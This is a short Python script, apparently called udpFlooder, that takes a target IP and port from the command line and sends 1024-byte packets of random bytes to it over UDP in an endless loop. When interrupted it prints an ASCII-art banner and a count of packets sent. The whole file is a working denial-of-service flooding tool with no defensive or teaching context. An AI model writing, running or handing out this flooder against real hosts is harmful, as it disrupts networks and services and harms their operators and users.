import socket
import random
import sys

def sent(dest_ip,dest_port):

    i = 0
    port = int(dest_port)
    ip = dest_ip

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)

    while True:
        try:

            i += 1
            sock.sendto(packet, (ip, port))

        except KeyboardInterrupt:

            print(f"""
                                    ░██
                                    ░██
░██    ░██  ░██████   ░████████  ░████████ ░██░████  ░██████    ░███████
░██    ░██       ░██  ░██    ░██    ░██    ░███           ░██  ░██
░██  ░██   ░███████  ░██    ░██    ░██    ░██       ░███████   ░███████
░██░██   ░██   ░██  ░██    ░██    ░██    ░██      ░██   ░██         ░██
░███     ░█████░██ ░██    ░██     ░████ ░██       ░█████░██  ░███████
_______________________________________________________________________________
packages sent: {i}
See you space cowboy!
""")
            exit()









try:
    if len(sys.argv[1]) > 3 and len(sys.argv[2]) >= 2:

        sent(sys.argv[1],sys.argv[2])
    else:

        print("_______________________________________________________________________________")
        print("usage: python3 udpFlooder <ip> <port>")

except IndexError:

    print('using default port 80')
    sent(sys.argv[1],80)